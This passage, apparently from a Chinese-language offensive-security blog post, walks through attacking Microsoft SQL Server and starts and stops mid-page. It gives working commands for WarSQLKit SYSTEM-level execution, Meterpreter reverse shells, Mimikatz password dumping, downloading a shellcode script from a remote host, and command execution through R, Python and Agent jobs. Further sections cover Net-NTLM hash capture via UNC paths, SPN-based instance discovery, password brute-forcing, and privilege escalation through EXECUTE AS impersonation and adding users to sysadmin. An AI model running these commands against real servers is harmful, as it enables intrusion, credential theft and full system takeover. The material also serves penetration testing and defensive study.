class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE sp_cmdExec</span><br><span class="line">@Command [nvarchar](max)</span><br><span class="line">WITH EXECUTE AS CALLER</span><br><span class="line">AS</span><br><span class="line">EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="/images/image48.png"></p><h4 id="WarSQLKit-执行命令"><a href="#WarSQLKit-执行命令" class="headerlink" title="WarSQLKit 执行命令"></a>WarSQLKit 执行命令</h4><p>WarSQLKit CmdExec实现了以下功能<br>执行任意Windows命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;whoami&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image49.png"><br>以SYSTEM权限执行Windows命令<br><img src="/images/image50.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;whoami &#x2F;RunSystemPriv&#39;;</span><br></pre></td></tr></table></figure><p>以SYSTEM权限运行PowerShell命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;powershell Get-ChildItem &#x2F;RunSystemPS&#39;;</span><br></pre></td></tr></table></figure><p>生成以SYSTEM权限运行的X86 Meterpreter反向连接shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_meterpreter_reverse_tcp LHOST LPORT GetSystem&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image51.png"></p><p>生成以SYSTEM权限运行的X64 Meterpreter反向连接shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem&#39;;</span><br></pre></td></tr></table></figure><p>生成以SYSTEM权限运行的X64 Meterpreter RC4反向连接shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem&#39;</span><br><span class="line">RC4PASSWORD&#x3D;123456</span><br></pre></td></tr></table></figure><p>生成以SYSTEM权限运行的X86 Meterpreter_bind_tcp shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_meterpreter_bind_tcp LPORT GetSystem&#39;;</span><br></pre></td></tr></table></figure><p>每次使用 Meterpreter反弹都会创建一个reverse进程<br><img src="/images/image52.png"></p><p>运行Mimikatz功能抓取密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_cmdExec &#39;sp_Mimikatz&#39;;</span><br><span class="line">select * from WarSQLKitTemp &#x2F;&#x2F;获取Mimikatz日志</span><br></pre></td></tr></table></figure><p><img src="/images/image53.png"><br>文件下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_downloadFile http:&#x2F;&#x2F;test.com&#x2F;Invoke--Shellcode.ps1</span><br><span class="line">C:\test\Invoke--Shellcode.ps1 300&#39;;</span><br><span class="line">EXEC sp_cmdExec &#39;sp_downloadFile http:&#x2F;&#x2F;10.251.0.33&#x2F;Invoke--Shellcode.ps1</span><br><span class="line">C:\test\Invoke--Shellcode.ps1 300&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image54.png"></p><p>获取MSSQL Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_getSqlHash&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image55.png"></p><p>获取Windows Product</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_getProduct&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image56.png"></p><p>获取可用的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#39;sp_getDatabases&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image57.png"></p><hr><h2 id="SQL-Server-R和Python的利用"><a href="#SQL-Server-R和Python的利用" class="headerlink" title="SQL Server R和Python的利用"></a>SQL Server R和Python的利用</h2><p>SQL Server 2017加入了Microsoft机器学习服务，该服务允许通过SQL Server中sp_execute_external_script 执行Python和R脚本</p><p>利用条件:</p><ul><li><p>Machine Learning Services必须要在Python安装过程中选择</p></li><li><p>必须启用外部脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#39;external scripts enabled&#39;, 1 RECONFIGURE WITH OVERRIDE</span><br></pre></td></tr></table></figure><ul><li>重新启动数据库服务器</li></ul></li><li><p>用户拥有执行任何外部脚本权限</p></li></ul><h3 id="R脚本利用"><a href="#R脚本利用" class="headerlink" title="R脚本利用"></a>R脚本利用</h3><p>利用R执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;external scripts enabled&#39;</span><br><span class="line">GO</span><br><span class="line">EXEC sp_execute_external_script</span><br><span class="line">@language&#x3D;N&#39;R&#39;,</span><br><span class="line">@script&#x3D;N&#39;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe</span><br><span class="line">&#x2F;c dir&quot;,intern&#x3D;T))&#39;</span><br><span class="line">WITH RESULT SETS (([cmd_out] text));</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>利用R抓取Net-NTLM哈希：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@script&#x3D;N&#39;.libPaths(&quot;\\\\testhost\\foo\\bar&quot;);library(&quot;0mgh4x&quot;)&#39;</span><br></pre></td></tr></table></figure><h3 id="Python脚本利用"><a href="#Python脚本利用" class="headerlink" title="Python脚本利用"></a>Python脚本利用</h3><p>Python ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec sp_execute_external_script</span><br><span class="line">@language &#x3D;N&#39;Python&#39;,</span><br><span class="line">@script&#x3D;N&#39;import sys</span><br><span class="line">OutputDataSet &#x3D; pandas.DataFrame([sys.version])&#39;</span><br><span class="line">WITH RESULT SETS ((python_version nvarchar(max)))</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exec sp_execute_external_script</span><br><span class="line">@language &#x3D;N&#39;Python&#39;,</span><br><span class="line">@script&#x3D;N&#39;import subprocess</span><br><span class="line">p &#x3D; subprocess.Popen(&quot;cmd.exe &#x2F;c whoami&quot;, stdout&#x3D;subprocess.PIPE)</span><br><span class="line">OutputDataSet &#x3D; pandas.DataFrame([str(p.stdout.read(), &quot;utf-8&quot;)])&#39;</span><br><span class="line">WITH RESULT SETS (([cmd_out] nvarchar(max)))</span><br></pre></td></tr></table></figure><hr><h2 id="SQL-Server代理执行计划任务"><a href="#SQL-Server代理执行计划任务" class="headerlink" title="SQL Server代理执行计划任务"></a>SQL Server代理执行计划任务</h2><p>SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务。<br>首先启动SQL Server代理服务。<br><img src="/images/image58.png"></p><p>执行计划任务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">EXEC dbo.sp_add_job @job_name &#x3D; N&#39;test_powershell_job1&#39;;</span><br><span class="line">EXEC sp_add_jobstep @job_name &#x3D; N&#39;test_powershell_job1&#39;, @step_name &#x3D;</span><br><span class="line">N&#39;test_powershell_name1&#39;, @subsystem &#x3D; N&#39;PowerShell&#39;, @command &#x3D;</span><br><span class="line">N&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &#x2F;all &gt;c:\\123.txt&#39;, @retry_attempts &#x3D; 1,</span><br><span class="line">@retry_interval &#x3D; 5 ;</span><br><span class="line">EXEC dbo.sp_add_jobserver @job_name &#x3D; N&#39;test_powershell_job1&#39;;</span><br><span class="line">EXEC dbo.sp_start_job N&#39;test_powershell_job1&#39;;</span><br></pre></td></tr></table></figure><p><img src="/images/image59.png"></p><hr><h1 id="攻击方实战思路分析"><a href="#攻击方实战思路分析" class="headerlink" title="攻击方实战思路分析"></a>攻击方实战思路分析</h1><p>第三章简单介绍了SQL Server中常见的一写利用点，接下来介绍这些利用面在各个攻击阶段中的应用和一些思路。</p><h2 id="SQL-Server实例发现"><a href="#SQL-Server实例发现" class="headerlink" title="SQL Server实例发现"></a>SQL Server实例发现</h2><p>SQL Server的实例发现，本地实例主要是通过检查系统服务和注册表方式。远程实例可以通过扫描TDS<br>监听服务、UDP广播、SPN服务等方式。 常见的几种实例发现工具:</p><ul><li><p><a href="https://docs.microsoft.com/en-us/sql/tools/osql-utility?view=sql-server-2017">osq</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osql -L</span><br></pre></td></tr></table></figure><p><img src="/images/image60.png"></p></li><li><p><a href="https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-2017">sqlcmd</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd -L</span><br></pre></td></tr></table></figure><p><img src="/images/image61.png"></p></li><li><p><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 &#x2F;&#x2F;加载模块</span><br></pre></td></tr></table></figure><p><img src="/images/image62.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceBroadcast &#x2F;&#x2F;SQL Server实例发现</span><br></pre></td></tr></table></figure><p><img src="/images/image63.png"></p></li><li><p><a href="http://www.sqlsecurity.com/downloads">SQLPing3</a></p></li><li><p>Metasploit mssql_ping module </p></li><li><p>Nmap</p></li><li><p>Nessus</p></li><li><p>……</p></li></ul><h3 id="本地实例发现"><a href="#本地实例发现" class="headerlink" title="本地实例发现"></a>本地实例发现</h3><p>作为本地用户，主要是通过检查系统服务和注册表设置来标识SQL Server实例。检查系统服务<br><img src="/images/image64.png"></p><p>检查注册表键值，也可判断SQL Server实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server&quot; &#x2F;v InstalledInstances</span><br></pre></td></tr></table></figure><p><img src="/images/image65.png"></p><p>使用PowerUpSQL，来识别本地实例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 &#x2F;&#x2F;加载模块 Get-SQLInstanceLocal &#x2F;&#x2F;SQL Server实例发现</span><br></pre></td></tr></table></figure><p><img src="/images/image66.png"></p><h3 id="远程实例发现"><a href="#远程实例发现" class="headerlink" title="远程实例发现"></a>远程实例发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceBroadcast -Verbose &#x2F;&#x2F;UDP广播Ping Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 &#x2F;&#x2F;UDP端口扫描 Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get- SQLInstanceScanUDPThreaded -Verbose &#x2F;&#x2F;从文件获取实例列表</span><br></pre></td></tr></table></figure><h3 id="域内实例发现"><a href="#域内实例发现" class="headerlink" title="域内实例发现"></a>域内实例发现</h3><p>域内实例主要利用SPN扫描发现实例，先简单介绍一下什么是SPN服务。</p><h4 id="SPN服务"><a href="#SPN服务" class="headerlink" title="SPN服务"></a>SPN服务</h4><p>Windows 域环境是基于活动目录(Active Directory)服务工作的。为了在域环境中有效地对资源访问权限进行精细控制，提高网络环境的安全性和方便网络资源统一分配管理。系统给域内每种资源分配了不同的服务主体名称(Service Principal Name, SPN)。使用Kerberos协议进行身份验证的域环境中， 本地账号SPN将自动注册，但是，域内用户账号下运行的服务，必须为此域内账户手动注册。如下图 SQL Server服务运行在域内用户时的状态。</p><p><img src="/images/image67.png"></p><p>因为域中每台机器都要在Kerberos身份验证服务中注册SPN，所以攻击者可以向域控制器(AD)发送请求，获取SPN相关信息，得到某个服务资源在哪台服务器上。<br>SQL Server服务的SPN示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TERMSRV&#x2F;MSSQL2.sec.com:1433 服务组件名称&#x2F;主机名.域名:监听端口</span><br></pre></td></tr></table></figure><p>域内用户账号下运行的服务，手动注册SPN</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc&#x2F;MSSQL2.sec.com:1433 mssqluser</span><br></pre></td></tr></table></figure><p><img src="/images/image68.png"></p><p>更多SPN相关介绍请查看:<a href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx">https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx</a></p><p>域中安装的SQL Server会使用关联的服务帐户自动在活动目录(Active Directory)中注册，以支持 Kerberos身份验证。可以使用以下方式识别实例:：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -q *&#x2F;*</span><br></pre></td></tr></table></figure><p><img src="/images/image69.png"></p><ul><li><a href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx">setspn.exe</a></li><li><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">adfind.exe</a></li><li><a href="https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1">Get-Spn.psm1</a></li><li><a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain</span><br></pre></td></tr></table></figure><p><img src="/images/image70.png"></p><p>PowerUpSQL其他发现实例命令</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>使用备用域凭据 发现Active Directory域SQL Server实例</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe import- module PowerUpSQL.psd1 Get-SQLInstanceDomain -Verbose - DomainController 192.168.1.1 -Username domain\user -password Password123</td></tr><tr><td>列出使用特定域 帐户的SQL Server实例</td><td>Get-SQLInstanceDomain -Verbose -DomainAccount mssqluser</td></tr><tr><td>列出共享域用户 SQL Server服务 帐户</td><td>Get-SQLInstanceDomain -Verbose</td></tr></tbody></table><hr><h2 id="SQL-Server口令爆破"><a href="#SQL-Server口令爆破" class="headerlink" title="SQL Server口令爆破"></a>SQL Server口令爆破</h2><p>连接测试，两种功能均可用于测试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLConnectionTestThreaded</span><br><span class="line">Invoke-SQLAuditWeakLoginPw</span><br></pre></td></tr></table></figure><p><img src="/images/image71.png"><br>爆破必须的几个条件： </p><ul><li>常见的弱密码</li><li>当前的本地用户访问权限</li><li>当前域用户访问权限</li><li>备用域用户访问权限</li></ul><p>使用msf来执行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_login</span><br></pre></td></tr></table></figure><p><img src="/images/image72.jpeg"></p><p>PowerUpSQL其他获取账户相关命令：</p><table><thead><tr><th>描述</th><th>命令</th></tr></thead><tbody><tr><td>获取可用提供的SQL Server登录名登录的域 SQL Server列表。</td><td>$Targets = Get-SQLInstanceDomain -Verbose | Get- SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass | Where-Object {$_.Status -like “Accessible”} $Targets</td></tr><tr><td>获取可以使用当前域帐 户登录的域SQL服务器 的列表。</td><td>$Targets = Get-SQLInstanceDomain -Verbose | Get- SQLConnectionTestThreaded -Verbose -Threads 10 | Where- Object {$_.Status -like “Accessible”} $Targets</td></tr><tr><td>获取可以使用备用域帐 户登录的域SQL服务器 的列表。</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe Get- SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose - Threads 15</td></tr><tr><td>获取可以使用非域系统 中的备用域帐户登录的 域SQL服务器的列表。</td><td>runas /noprofile /netonly /user:domain\user PowerShell.exe Get- SQLInstanceDomain -Verbose -Username ‘domain\user’ -Password ‘MyPassword!’ -DomainController 10.1.1.1 | Get- SQLConnectionTestThreaded -Verbose -Threads 15</td></tr><tr><td>发现域SQL Server，并 根据实例名称确定它们 是否配置有普通应用程 序使用的默认密码。</td><td>Get-SQLInstanceDomain</td></tr></tbody></table><hr><h2 id="SQL-Server权限提升"><a href="#SQL-Server权限提升" class="headerlink" title="SQL Server权限提升"></a>SQL Server权限提升</h2><p>权限提升基本的一个思路:<br><img src="/images/image73.png"></p><p>域用户可以到处登录的前置条件。</p><ul><li>添加了域用户</li><li>已添加本地用户</li><li>特权继承</li></ul><p>获得Sysadmin权限的一些利用点：<br><img src="/images/image74.jpeg"></p><h3 id="获得低权限账号"><a href="#获得低权限账号" class="headerlink" title="获得低权限账号"></a>获得低权限账号</h3><p>可以使用常用的凭据执行爆破，但要注意帐户锁定。<br>以PowerUpSQL为例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 &#x2F;&#x2F;加载模块。</span><br><span class="line">Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw &#x2F;&#x2F;从未经身份验证的用户角度发起攻 击。</span><br><span class="line">Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw &#x2F;&#x2F;从域用户角度开始攻击。 Get-SQLInstanceScanUDP | Get-SQLConnectionTestThreaded -Username &lt;USERNAME&gt; - Password &lt;PASSWORD&gt; &#x2F;&#x2F;手动连接到已标识的SQL Server实例。</span><br></pre></td></tr></table></figure><p>许多使用SQL Server Express作为后端的应用程序都是使用特定的凭据和实例名称配置的。使用以下命令检查这些凭据:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 &#x2F;&#x2F;加载模块。 Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw</span><br></pre></td></tr></table></figure><p>如果与SQL Server的通信未加密，我们可以执行MITM攻击来注入们自己的查询。根据欺骗的用户特权，我们可以注入SQL登录名。</p><ul><li><a href="https://gist.github.com/anonymous/edb02df90942dc4df0e41f3cbb78660b">sqlmitm.py</a> </li></ul><h3 id="使用本地或域用户账号"><a href="#使用本地或域用户账号" class="headerlink" title="使用本地或域用户账号"></a>使用本地或域用户账号</h3><p>尝试使用当前帐户登录到SQL Server。过多的登录特权是常见的配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUpSQL.psd1</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLConnectionTest</span><br><span class="line">Get-SQLInstanceLocal | Get-SQLConnectionTest</span><br></pre></td></tr></table></figure><h3 id="从Public到Sysadmin"><a href="#从Public到Sysadmin" class="headerlink" title="从Public到Sysadmin"></a>从Public到Sysadmin</h3><p>猜测弱密码获得高权限角色账号，一般需要以下两步： </p><ul><li>枚举登录名</li><li>猜测密码</li></ul><h4 id="枚举登录名"><a href="#枚举登录名" class="headerlink" title="枚举登录名"></a>枚举登录名</h4><p>默认情况下，Public角色成员不能选择本地列表登录，但可以进行Fuzz登录名。如果尝试枚举所有SQL Server登录名枚举，则只会看到其中一部分。查询出所有SQL Server登录名:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sys.syslogins</span><br></pre></td></tr></table></figure><p><img src="/images/image75.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sys.server_principals</span><br></pre></td></tr></table></figure><p><img src="/images/image76.png"></p><p>suser_name返回给定主体ID的主体名称。可以通过使用Public角色，在suser_name函数中枚举主体ID值来标识SQL登录名。查询示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_NAME(1)</span><br><span class="line">SELECT SUSER_NAME(2)</span><br><span class="line">SELECT SUSER_NAME(3)</span><br><span class="line">SELECT SUSER_NAME(4)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/images/image77.png"></p><h4 id="猜测密码"><a href="#猜测密码" class="headerlink" title="猜测密码"></a>猜测密码</h4><p>使用PowerUpSQL尝试对那些已识别出的的SQL Server登录名使用弱口令爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLFuzzServerLogin -Instance ComputerNAme\InstanceName &#x2F;&#x2F;PowerUpSQL Blind SQL登录枚举</span><br><span class="line">Invoke-SQLAuditWeakLoginPw</span><br></pre></td></tr></table></figure><h4 id="获取当前域内用户名"><a href="#获取当前域内用户名" class="headerlink" title="获取当前域内用户名"></a>获取当前域内用户名</h4><p>public角色可以获取当前域信息，有利用盲猜域内其他组SID或用户名。 获取SQL Server所在的域:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DEFAULT_DOMAIN() as mydomain</span><br></pre></td></tr></table></figure><p><img src="/images/image78.png"><br>获取域内用户的完整SID。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_SID(&#39;&lt;Identified_Domain&gt;\Domain Admins&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image79.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x010500000000000515000000CAAE870FA5F89ACD856A619851040000</span><br></pre></td></tr></table></figure><p>获取域内Admins组的完整RID。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_SID(&#39;&lt;Identified_Domain&gt;\Domain Admins&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image80.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x010500000000000515000000CAAE870FA5F89ACD856A619800020000</span><br></pre></td></tr></table></figure><p>抓取完整RID的前48个字节以获取域的SID。通过将十六进制数字值附加到先前的SID来创建新的RID（将与域对象相关联）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RID&#x3D;0x010500000000000515000000CAAE870FA5F89ACD856A619851040000 SELECT SUSER_NAME(RID) &#x2F;&#x2F;获取与RID关联的域对象名称。</span><br></pre></td></tr></table></figure><p>PowerUpSQL也可盲猜域帐户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLFuzzDomainAccount -Instance ComputerNAme\InstanceName</span><br></pre></td></tr></table></figure><h3 id="利用Public获得更多权限"><a href="#利用Public获得更多权限" class="headerlink" title="利用Public获得更多权限"></a>利用Public获得更多权限</h3><p>在具有对SQL Server的Public权限账号的上下文中，最常用的获取执行权限的方法是:</p><ul><li>特权模拟</li><li>存储过程和触发器创建/注入</li><li>写入存储过程的自动执行</li><li>SQL Server代理任务</li><li>xp_cmdshell</li><li>创建数据库链接到文件或服务器</li><li>导入/安装自定义CLR程序集</li><li>临时查询</li><li>共享服务帐户</li><li>数据库链接</li><li>UNC路径注入</li><li>Python/R脚本执行。</li></ul><p>以上大部分内容在SQL Server常用攻击面已经介绍，不再赘述，下面简单介绍一下前面未提的方法。</p><h4 id="特权模拟"><a href="#特权模拟" class="headerlink" title="特权模拟"></a>特权模拟</h4><p>SQL Server中有一个特权/权限，它允许权限较低的用户，模拟行使另一个具有更多访问权限的用户。不限制执行查询/命令，但必须将数据库配置为允许OS命令执行对象。</p><h4 id="EXECUTE-AS语句"><a href="#EXECUTE-AS语句" class="headerlink" title="EXECUTE AS语句"></a>EXECUTE AS语句</h4><p>默认情况下，会话在用户登录时开始，并在用户注销时结束。会话期间的所有操作都必须对该用户进行 权限检查。当一个EXECUTE AS语句运行，会话的执行上下文切换到指定的登录名或用户名。上下文切 换之后，将针对该帐户的登录名和用户安全性令牌而不是调用EXECUTE AS语句的人员检查权限。本质 上，在会话或模块执行期间将模拟用户或登录帐户，或者显式还原上下文切换。<br>使用public角色用户testuser，手动检查是否是sa登录:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;) &#x2F;&#x2F;检查SQL Server 登录名是否为指定服务器角色的成员。</span><br></pre></td></tr></table></figure><p><img src="/images/image81.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE AS LOGIN &#x3D; &#39;sa&#39; &#x2F;&#x2F;模拟sa数据库级别，对于服务器级别，请使用EXECUTE AS USER。</span><br></pre></td></tr></table></figure><p><img src="/images/image82.png"><br>再次使用public角色用户testuser，手动检查目前模拟为sa登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT SYSTEM_USER</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</span><br></pre></td></tr></table></figure><p><img src="/images/image83.png"></p><h4 id="存储过程和触发器创建-注入"><a href="#存储过程和触发器创建-注入" class="headerlink" title="存储过程和触发器创建/注入"></a>存储过程和触发器创建/注入</h4><p>开发人员的一个常见错误是将他们要使用的所有功能，将其写入存储过程中，以便能够在其他用户的上 下文中执行。这些存储过程可以作为数据库的所有者(拥有所有者的EXECUTE AS)来执行，以使它可以 访问其他资源。也可以在高权限用户的上下文中进行执行，并且不需要授予特权。但是，从安全的角度 来看，采用此方法有一些缺点:：</p><ul><li>无法精细控制数据库所有者的权限。</li><li>普通帐户或sysadmin帐户通常拥有数据库。</li></ul><p>DB_OWNER角色可以使用EXECUTE AS OWNER在sa或sysadmin帐户的上下文中执行。如果这些存储过 程实现不安全，则可以通过扩展存储过程来通过SQL注入或命令注入进行模拟。例子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USE test2</span><br><span class="line">GO</span><br><span class="line">CREATE PROCEDURE test_imitation2</span><br><span class="line">WITH EXECUTE AS OWNER</span><br><span class="line">AS</span><br><span class="line">EXEC sp_addsrvrolemember &#39;testuser&#39;,&#39;sysadmin&#39;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>必须将数据库配置为值得信赖的OS命令执行程序。虽然可以通过SQL或命令注入进行模拟，但是创建存储过程或触发器是更好的选择。</p><p><img src="/images/image84.png"></p><p>攻击场景:<br>DBA对Web应用程序执行以下操作:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 